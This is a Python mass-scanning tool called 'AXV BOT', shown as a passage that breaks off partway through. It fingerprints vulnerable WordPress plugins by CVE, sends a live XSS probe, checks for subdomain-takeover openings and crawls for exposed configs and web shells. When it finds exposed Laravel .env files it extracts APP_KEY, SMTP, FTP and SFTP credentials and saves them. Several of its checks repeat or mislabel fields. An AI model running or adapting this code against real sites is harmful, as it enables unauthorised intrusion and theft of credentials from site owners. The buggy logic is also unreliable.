import requests
import sys
import time
import re
import os
import socket
from pystyle import Colors,Colorate,Write
from fake_useragent import UserAgent
from colorama import Fore,Style,init
from rich import print as cetak
from multiprocessing.dummy import Pool, Lock, Semaphore
import requests,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from multiprocessing import Pool
from bs4 import BeautifulSoup
init(autoreset=True)
headersx = {'User-Agent': UserAgent().random}
red = Fore.RED
green = Fore.GREEN 
yellow = Fore.YELLOW
white = Fore.WHITE
blue = Fore.BLUE
MAX_THREADS = 50
thread_semaphore = Semaphore(MAX_THREADS)
thread_lock = Lock()

def clear():
	if sys.platform.startswith('linux'):
		os.system('clear')
	elif sys.platform.startswith('freebsd'):
		os.system('clear')
	else:
		os.system('cls')

def gui():
	Write.Print("─══════════════════════════ቐቐ══════════════════════════─\n", Colors.blue_to_purple, interval=0.01)
	text = f""" 
 █████╗ ██╗  ██╗██╗   ██╗    ██████╗  ██████╗ ████████╗
██╔══██╗╚██╗██╔╝██║   ██║    ██╔══██╗██╔═══██╗╚══██╔══╝
███████║ ╚███╔╝ ██║   ██║    ██████╔╝██║   ██║   ██║   
██╔══██║ ██╔██╗ ╚██╗ ██╔╝    ██╔══██╗██║   ██║   ██║   
██║  ██║██╔╝ ██╗ ╚████╔╝     ██████╔╝╚██████╔╝   ██║   
╚═╝  ╚═╝╚═╝  ╚═╝  ╚═══╝      ╚═════╝  ╚═════╝    ╚═╝  

# CREATED BY : t.me/AXVDIGITAL
# TOOLS NAME : SCAN ALL VULNNERBILITY
# SAVED TO : results/"""
	for N, line in enumerate(text.split("\n")):
		print(Colorate.Horizontal(Colors.red_to_green, line, 1))
		time.sleep(0.05)
	Write.Print("\n─══════════════════════════ቐቐ══════════════════════════─\n\n", Colors.blue_to_purple, interval=0.01)


def CVE4666(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/form-maker/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'= (\d+).(\d+).(\d+) =', soup)
		if version:
			v = version.group()
			x = v.split(" ")
			x2 = int(x[0])
			x3 = int(x[1])
			x4 = int(x[2])
			if x2 <= 1 and x3 <= 15 and x4 <= 19:
				open("results/CVE-2023-4666.txt","a+").write(f"http://{domain}/wp-content/plugins/form-maker/readme.txt\n")
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-4666!")
			else:pass
		else:pass
	except:pass

def Cve5360(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/royal-elementor-addons/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'Royal Elementor Addons v(\d+).(\d+).(\d+)', soup)
		if version:
			v = version.group()
			y = v.find('v')
			y1 = v[y+1:].strip()
			x = y1.split(".")
			x2 = int(x[0])
			x3 = int(x[1])
			x4 = int(x[2])
			if x2 <= 1 and x3 <= 3 and x4 <= 78:
				open("results/CVE-2023-5360.txt","a+").write(f"http://{domain}/wp-content/plugins/royal-elementor-addons/readme.txt\n")
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-5360!")
			else:pass
		else:
			pass
	except:pass

def CVE5504(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/backwpup/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'= (\d+).(\d+).(\d+) =', soup)
		if version:
			v = version.group()
			xx = v.split(" ")
			x = xx[1].split('.')
			x2 = int(x[0])
			x3 = int(x[1])
			x4 = int(x[2])
			if x2 <= 4 and x3 <= 0 and x4 < 2:
				open("results/CVE-2023-5504.txt","a+").write(f"http://{domain}/wp-content/plugins/backwpup/readme.txt\n")
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-5504!")
			else:pass
		else:
			pass
	except:pass

def CVE6063(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/wp-fastest-cache/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'= (\d+).(\d+).(\d+) =', soup)
		if version:
			v = version.group()
			xx = v.split(" ")
			x = xx[1].split('.')
			x2 = int(x[0])
			x3 = int(x[1])
			x4 = int(x[2])
			if x2 <= 1 and x3 <= 2 and x4 < 2:
				open("results/CVE-2023-6063.txt","a+").write(f"http://{domain}/wp-content/plugins/wp-fastest-cache/readme.txt\n")
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-6063!")
			else:pass
		else:
			pass
	except:pass

def CVE6266(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/backup-backup/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'= (\d+).(\d+).(\d+) =', soup)
		if version:
			v = version.group()
			xx = v.split(" ")
			x = xx[1].split('.')
			x2 = int(x[0])
			x3 = int(x[1])
			x4 = int(x[2])
			if x2 <= 1 and x3 <= 3 and x4 < 7:
				open("results/CVE-2023-6266.txt","a+").write(f"http://{domain}/wp-content/plugins/backup-backup/readme.txt\n")
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-6266!")
			else:pass
		else:
			pass
	except:pass

# def CVE230099(domain):
# 	try:
# 		domain = ''.join(domain)
# 		domain = domain.strip()
# 		domain = re.sub(r'https?://', '', domain)
# 		reqs = requests.get(f"http://{domain}/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=<script>alert(\"axvtechXss\")</script>", headers=headersx, timeout=5, verify=False).text
# 		if 'axvtechXss' in reqs:
# 			open("results/CVE-2023-0099.txt","a+").write(f"http://{domain}/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=<script>alert(\"axvtechXss\")</script>\n")
# 			print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-0099!")
# 		else:pass
# 	except:pass

def Cve20234596(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/forminator/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'Stable tag: (\d+).(\d+).(\d+)', soup)
		if version:
			v = version.group()
			x = v.split(": ")
			xx = x[1].split('.')
			x2 = int(xx[0])
			x3 = int(xx[1])
			x4 = int(xx[2])
			if x2 == 1 and x3 == 24 and x4 == 6:
				open("results/CVE-2023-4596.txt","a+").write(f"http://{domain}/wp-content/plugins/forminator/readme.txt\n")
				print(f"|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-4596!")
			else:pass
		else:
			pass
	except:pass

def Cve202134621(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/wp-user-avatar/readme.txt", headers=headersx, timeout=5, verify=False)
		soup = BeautifulSoup(reqs.text, 'html.parser')
		soup = str(soup)
		version = re.search(r'Stable tag: (\d+).(\d+).(\d+)', soup)
		if version:
			v = version.group()
			x = v.split(": ")
			xx = x[1].split('.')
			x2 = int(xx[0])
			x3 = int(xx[1])
			x4 = int(xx[2])
			if x2 == 3 and x3 == 1 and x4 == 3:
				open("results/CVE-2021-34621.txt","a+").write(f"http://{domain}/wp-content/plugins/wp-user-avatar/readme.txt\n")
				print(f"|- {white}http://{domain} {yellow}| {green}Vuln CVE-2021-34621!")
			else:pass
		else:
			pass
	except:pass
 
def Cve202328121(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		req_Cve202328121 = requests.get(f'http://{domain}/wp-content/plugins/woocommerce-payments/readme.txt', headers=headersx, timeout=5, verify=False).text
		if "WooCommerce Payments" in req_Cve202328121 and 'Description' in req_Cve202328121:
			versi = re.findall('\sStable tag: (.*?)\s', req_Cve202328121)
			versi = ''.join(versi)
			if versi <= '5.7.1':
				open("results/CVE-2023-28121.txt","a+").write(f'http://{domain}/wp-content/plugins/woocommerce-payments/readme.txt\n')
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln CVE-2023-28121")
			else:pass
		else:pass
	except:pass

def github(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		req_github = requests.get(f"http://axvtech.{domain}", headers=headersx, timeout=5, verify=False).text
		if "There isn\'t a GitHub Pages site here." in req_github:
			open("results/github.txt","a+").write(f"http://{domain}\n")
			print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln Github!")
		else:pass
	except:pass

def pantheon(domain):
	try:
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		req_pantheon = requests.get(f"http://x00xx0.{domain}", headers=headersx, timeout=5, verify=False).text
		if '>Pantheon<' in req_pantheon or 'pantheon.io' in req_pantheon:
			open("results/pantheon.txt","a+").write(f"http://{domain}\n")
			print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln Patheon!")
		else:pass
	except:pass
 
def CVE230099(domain):
	try:
		headersx = {'User-Agent': UserAgent().random}
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		reqs = requests.get(f"http://{domain}/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=<script>alert(\"axvtechXss\")</script>", headers=headersx, timeout=7, verify=False).text
		if 'axvtechXss' in reqs:
			open("results/CVE-2023-0099.txt","a+").write(f"http://{domain}/wp-content/plugins/simple-urls/admin/assets/js/import-js.php?search=<script>alert(\"axvtechXss\")</script>\n")
			print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln!")
		else:print(f"{blue}|- {white}http://{domain} {yellow}| {red}Not Vuln!")
	except:pass

def scanall(domain, id_tele):
	try:
		CVE4666(domain)
		Cve5360(domain)
		CVE5504(domain)
		CVE6063(domain)
		CVE6266(domain)
		CVE230099(domain)
		Cve20234596(domain)
		Cve202134621(domain)
		Cve202328121(domain)
		github(domain)
		pantheon(domain)
		domain = ''.join(domain)
		domain = domain.strip()
		domain = re.sub(r'https?://', '', domain)
		ua = {'User-Agent': UserAgent().random}
		ipdomen = socket.gethostbyname(domain) #modules/E0WUskCnxvj1gnuLG5Fb/PlCiKL7dCKvlmWY8imn4/path/list
		for path in open('wordlist/pathVuln.txt', 'r', encoding="utf-8").readlines():
			path = path.strip()
			req = requests.get(f"http://{domain}{path}", verify=False, timeout=10, headers=ua).text
			if 'Netscape HTTP Cookie File' in req:
				open("results/ajaxfilemanager.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln AjaxFM!")
			elif '>perl.alfa<' in req or '>py.alfa<' in req or '>bash.alfa<' in req:
				open("results/AlfaData.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln AlfaData!")
			elif '"name":' in req and '"require-dev":' in req:
				open("results/composer_config.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Composer_Config!")
			elif '# phpMyAdmin MySQL-Dump' in req or 'varchar(70)' in req or '/root/mysql' in req or 'Msql->connect' in req or 'db_host' in req or 'import pymysql' in req or 'MySQL dump' in req or 'INSERT INTO `' in req or 'CREATE TABLE `' in req:
				open("results/db_dump.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln DB_Dump!")
			elif "MethodNotAllowedHttpException" in req:
				open("results/debugRCE.txt","a+").write(f'http://{domain}/_ignition/execute-solution\n')
				print(f"{blue}|- {white}http://{domain} {yellow}| {green}Vuln Debug_RCE!")
			elif "FTPSync" in req and 'SublimeText2-FTPSync' in req:
				open("results/ftpsync.txt","a+").write(f'http://{domain}{path}\n')
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln FTP_Sync!")
			elif 'Responsive FileManager' in req:
				open("results/gitExpose.txt","a+").write(f"http://{domain}/.git/\n")
				print(f"{blue}|- {white}http://{domain}/.git/ {yellow}| {green}Vuln Git Expose!")
			elif 'Netscape HTTP Cookie File' in req:
				open("results/cookieLog.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln CookieLog!")
			elif "AxvInjection1337" in req and '</node>' in req:
				open("results/jckeditor.txt","a+").write(f'http://{domain}{path}\n')
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln JCKEDITOR!")
			elif '$host' in req:
				open("results/joomla_config.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln JoomlaConfig!")
			elif '{"files":[{"name":"' in req:
				open("results/jqueryUpload.txt","a+").write(f"http://{domain}{path}\n")  
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln JqueryUpload!")
			elif 'kc_FCKeditor' in req and 'alert("Unknown error");' in req:
				open("results/kcfinder.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Kcfinder!")
			elif '<title>KCFinder: /' in req and '>Upload</' in req:
				open("results/kcfinderFileUpload.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Kcfinder_File_Uploads!")
			elif 'ErrorException' in req and '{"exception"' in req:
				open("results/laravelLog.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Laravel_Log!")
			elif '<title>File Manager' in req or "/vendor/laravel-filemanager/" in req:
				open("results/LaravelFilemanager.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Laravel_File_Manager!")
			elif 'Leaf PHPMailer' in req or ">alexusMailer 2.0<" in req or '>Owl PHPMailer' in req or 'Mailer V1.0' in req or 'PHP Mailer Script' in req or 'Inbox Mass Mailer' in req or 'n30Mailer' in req:
				open("results/mailer.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Mailer!")
			elif '/nginx/log' in req and "Parent Directory" in req:
				open("results/nginxLog.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Ngix_Log!")
			elif 'parameters:' in req and 'database_host:' in req:
				open("results/parameters_yml.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Parameters YML!")
			elif 'Allow: /' in req and 'phpInfos.txt of the following site has the following data:' in req:
				open("results/phpInfo.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln PHPInfo!")
			elif 'PHP License as published by the PHP Group' in req:
				open("results/PHPUnit.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln PHPUnit!")
			elif '"name":' in req and '"require-dev":' in req:
				open("results/password_log.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Password Log!")
			elif 'Responsive FileManager' in req:
				open("results/RoxyFileManager.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln RoxyFileManager!")
			elif 'Responsive FileManager' in req:
				open("results/rfm.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln RFM!")
			elif 'Allow: /' in req and 'robots.txt of the following site has the following data:' in req:
				open("results/robots.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Robots TXT!")
			elif '"type": "sftp"' in req:
				open("results/sftpconfig.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln SFTP!")
			elif 'File Attachment Upload' in req and 'file2attach' in req:
				open("results/slims.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Slimss!")
			elif 'Loading the dialog' in req:
				open("results/telerik.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln Telerik!")
			elif "Essential Addons for Elementor" in req and 'Description' in req:
				open("results/WPelementor.txt","a+").write(f'http://{domain}{path}\n')
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP_Elementor!")
			elif 'DB_USER' in req:
				open("results/WP_config.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Config!")
			elif '{"status":"NOK", "ERR":"This file is incorect"}' in req:
				open("results/WP_ghost_themes.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Ghost Themes!")
			elif '<title>WordPress &rsaquo; Installation</title>' in req and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req:
				open("results/WP_install.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Install!")
			elif "<title>WordPress &rsaquo; Setup Configuration File</title>" and '<option value="" lang="en" selected="selected" data-continue="Continue" data-installed="1">English (United States)</option>' in req:
				open("results/wpsetup.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Setup!")
			elif "wp-content/themes/intense&mode=upload'>Upl file</a></td>" in req:
				open("results/WP_intense.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Intense!")
			elif "error" in req and '<style>undefined</style>' in req:
				open("results/WP_orange_themes.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln WP Orange!")
			elif 'debug_log.txt' in req:
				rex_wpsmtp = re.findall('<a href="(.*?)_debug_log.txt">', req)
				open("results/EasyWPSmtp.txt","a+").write(f"http://{domain}{path}{rex_wpsmtp}\n")
				print(f"{blue}|- {white}http://{domain}{path}{rex_wpsmtp} {yellow}| {green}Vuln WP Orange!")   
			elif 'APP_NAME=' in req and 'DB_HOST=' in req:
				open("results/env.txt","a+").write(f"http://{domain}{path}\n")
				print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Vuln LARAVEL!")
				appkeyrce = re.findall('\sAPP_KEY=base64:(.*?)\s', req)
				appkeyrce = ''.join(appkeyrce)
				open("results/appkey.txt","a+").write('http://' + domain + ' | APP_KEY=' + appkeyrce + "\n")
				emailaws = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				if len(emailaws) == 0:
					pass
				else:open('results/amazonmail.txt', 'a+').write(emailaws + '\n')
				#othersmtp
				rocmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				rocmailhost = ''.join(rocmailhost)
				rocmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				rocmailport = ''.join(rocmailport)
				rocmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				rocmailuser = ''.join(rocmailuser)
				rocmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				rocmailpass = ''.join(rocmailpass)
				rocmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				rocmailadd = ''.join(rocmailadd)
				rocmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				rocmailname = ''.join(rocmailname)
				if '.gmail.com' in req or 'secure.emailsrvr.com' in req or 'smtp.mailgun.org' in req or '.mailjet.com' in req or 'smtp-relay.sendinblue.com' in req or 'smtp.mandrillapp.com' in req or 'smtp.zoho.com' in req or 'smtp.ionos.com' in req or 'smtp.office365.com' in req or 'smtp.1and1' in req or 'smtp.sendgrid.net' in req or 'email-smtp.us-south-1.amazonaws.com' in req or 'smtp.mailtrap.io' in req:
					pass
				else:
					open("results/other_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={rocmailhost}\n[+] MAIL_PORT={rocmailport}\n[+] MAIL_USERNAME={rocmailuser}\n[+] MAIL_PASSWORD={rocmailpass}\n[+] MAIL_FROM_ADDRESS={rocmailadd}\n[+] MAIL_FROM_NAME={rocmailname}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found OTHER SMTP!")
				#ionos
				iomailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				iomailhost = ''.join(iomailhost)
				iomailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				iomailport = ''.join(iomailport)
				iomailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				iomailuser = ''.join(iomailuser)
				iomailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				iomailpass = ''.join(iomailpass)
				iomailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				iomailenc = ''.join(iomailenc)
				if 'smtp.ionos.com' in req:
					open("results/ionos_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={iomailhost}\n[+] MAIL_PORT={iomailport}\n[+] MAIL_USERNAME={iomailuser}\n[+] MAIL_PASSWORD={iomailpass}\n[+] MAIL_ENCRYPTION={iomailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found IONOS SMTP!")
				else:pass
				#yahoo
				yahmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				yahmailhost = ''.join(yahmailhost)
				yahmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				yahmailport = ''.join(yahmailport)
				yahmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				yahmailuser = ''.join(yahmailuser)
				yahmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				yahmailpassw = ''.join(yahmailpassw)
				yahmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				yahmailenc = ''.join(yahmailenc)
				if 'smtp.yahoo.com' in req:
					open("results/yahoo_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={yahmailhost}\n[+] MAIL_PORT={yahmailport}\n[+] MAIL_USERNAME={yahmailuser}\n[+] MAIL_PASSWORD={yahmailpassw}\n[+] MAIL_ENCRYPTION={yahmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found YAHOO SMTP!")
				else:pass
				#outlook
				outmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				outmailhost = ''.join(outmailhost)
				outmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				outmailport = ''.join(outmailport)
				outmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				outmailuser = ''.join(outmailuser)
				outmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				outmailpassw = ''.join(outmailpassw)
				outmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				outmailenc = ''.join(outmailenc)
				if 'smtp-mail.outlook.com' in req:
					open("results/outlook_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={outmailhost}\n[+] MAIL_PORT={outmailport}\n[+] MAIL_USERNAME={outmailuser}\n[+] MAIL_PASSWORD={outmailpassw}\n[+] MAIL_ENCRYPTION={outmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found OUTLOOK SMTP!")
				else:pass
				#aol
				aolmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				aolmailhost = ''.join(aolmailhost)
				aolmailport = re.findall('\sMAIL_PORT=(.*?)\s', req)
				aolmailport = ''.join(aolmailport)
				aolmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				aolmailuser = ''.join(aolmailuser)
				aolmailpassw = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				aolmailpassw = ''.join(aolmailpassw)
				aolmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				aolmailenc = ''.join(aolmailenc)
				if 'smtp.aol.com' in req:
					open("results/aol_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={aolmailhost}\n[+] MAIL_PORT={aolmailport}\n[+] MAIL_USERNAME={aolmailuser}\n[+] MAIL_PASSWORD={aolmailpassw}\n[+] MAIL_ENCRYPTION={aolmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found AOL SMTP!")
				else:pass
				#zoho
				zohmailhost = re.findall('\sMAIL_HOST=(.*?)\s', req)
				zohmailhost = ''.join(zohmailhost)
				zohmailuser = re.findall('\sMAIL_PORT=(.*?)\s', req)
				zohmailuser = ''.join(zohmailuser)
				zohmailport = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				zohmailport = ''.join(zohmailport)
				zohmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				zohmailpass = ''.join(zohmailpass)
				zohmailenc = re.findall('\sMAIL_ENCRYPTION=(.*?)\s', req)
				zohmailenc = ''.join(zohmailenc)
				if 'smtp.zoho.com' in req:
					open("results/zoho_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_HOST={zohmailhost}\n[+] MAIL_PORT={zohmailuser}\n[+] MAIL_USERNAME={zohmailport}\n[+] MAIL_PASSWORD={zohmailpass}\n[+] MAIL_ENCRYPTION={zohmailenc}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found ZOHO SMTP!")
				else:pass
				#ftpuser
				ftpuhost = re.findall('\sFTP_USER=(.*?)\s', req)
				ftpuhost = ''.join(ftpuhost)
				ftpuport = re.findall('\sFTP_PORT=(.*?)\s', req)
				ftpuport = ''.join(ftpuport)
				ftpuuser = re.findall('\sFTP_HOST=(.*?)\s', req)
				ftpuuser = ''.join(ftpuuser)
				ftpupass = re.findall('\sFTP_PASS=(.*?)\s', req)
				ftpupass = ''.join(ftpupass)
				if len(ftpuhost) == 0 or len(ftpupass) == 0:
					pass
				else:
					open("results/ftpacc.txt","a+").write(f"[+] HOST={domain}{path}\n[+] FTP_USER={ftpuhost}\n[+] FTP_PORT={ftpuport}\n[+] FTP_USERNAME={ftpuuser}\n[+] FTP_PASSWORD={ftpupass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found FTPACC!")
				#sftpuser
				sftpuhost = re.findall('\sSFTP_USER=(.*?)\s', req)
				sftpuhost = ''.join(sftpuhost)
				sftpuport = re.findall('\sSFTP_PORT=(.*?)\s', req)
				sftpuport = ''.join(sftpuport)
				sftpuuser = re.findall('\sSFTP_HOST=(.*?)\s', req)
				sftpuuser = ''.join(sftpuuser)
				sftpupass = re.findall('\sSFTP_PASS=(.*?)\s', req)
				sftpupass = ''.join(sftpupass)
				if len(sftpuhost) == 0 or len(sftpupass) == 0:
					pass
				else:
					open("results/ftpacc.txt","a+").write(f"[+] HOST={domain}{path}\n[+] SFTP_USER={sftpuhost}\n[+] SFTP_PORT={sftpuport}\n[+] SFTP_USERNAME={sftpuuser}\n[+] SFTP_PASSWORD={sftpupass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found SFTP!")
				#mandrillapp
				mmailhost = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				mmailhost = ''.join(mmailhost)
				mmailn = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				mmailn = ''.join(mmailn)
				mmuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				mmuser = ''.join(mmuser)
				mmpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				mmpass = ''.join(mmpass)
				if 'smtp.mandrillapp.com' in req:
					open("results/mandrillapp_smtp.txt","a+").write(f"[+] HOST={domain}{path}\n[+] MAIL_FROM_ADDRESS={mmailhost}\n[+] MAIL_FROM_NAME={mmailn}\n[+] MAIL_USERNAME={mmuser}\n[+] MAIL_PASSWORD={mmpass}\n=========================\n")
					print(f"{blue}|- {white}http://{domain}{path} {yellow}| {green}Found MANDRILLAPP SMTP!")
				else:pass
				#sendinblue
				senmailadd = re.findall('\sMAIL_FROM_ADDRESS=(.*?)\s', req)
				senmailadd = ''.join(senmailadd)
				senmailname = re.findall('\sMAIL_FROM_NAME=(.*?)\s', req)
				senmailname = ''.join(senmailname)
				senmailuser = re.findall('\sMAIL_USERNAME=(.*?)\s', req)
				senmailuser = ''.join(senmailuser)
				senmailpass = re.findall('\sMAIL_PASSWORD=(.*?)\s', req)
				senmailpass = ''.join(senmailpass)
				if 'smtp-relay.sendinblue.com' in req:
